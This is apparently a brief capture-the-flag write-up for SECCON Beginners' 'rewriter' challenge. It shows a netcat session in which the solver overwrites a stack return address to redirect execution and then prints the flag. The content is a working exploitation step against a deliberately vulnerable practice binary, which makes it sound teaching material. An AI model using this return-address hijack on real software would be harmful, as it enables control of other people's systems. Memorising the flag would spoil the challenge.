# rewriter
```
$ nc rewriter.quals.beginners.seccon.jp 4103

[Addr]              |[Value]             
====================+===================
 0x00007ffe9b24af60 | 0x0000000000000000  <- buf
 0x00007ffe9b24af68 | 0x0000000000000000 
 0x00007ffe9b24af70 | 0x0000000000000000 
 0x00007ffe9b24af78 | 0x0000000000000000 
 0x00007ffe9b24af80 | 0x0000000000000000  <- target
 0x00007ffe9b24af88 | 0x0000000000000000  <- value
 0x00007ffe9b24af90 | 0x0000000000401520  <- saved rbp
 0x00007ffe9b24af98 | 0x00007f359db44bf7  <- saved ret addr
 0x00007ffe9b24afa0 | 0x0000000000000001 
 0x00007ffe9b24afa8 | 0x00007ffe9b24b078 

Where would you like to rewrite it?
> 0x00007ffe9b24af98
0x00007ffe9b24af98 = 0x4011f6
```
flag: `ctf4b{th3_r3turn_4ddr355_15_1n_th3_5t4ck}`
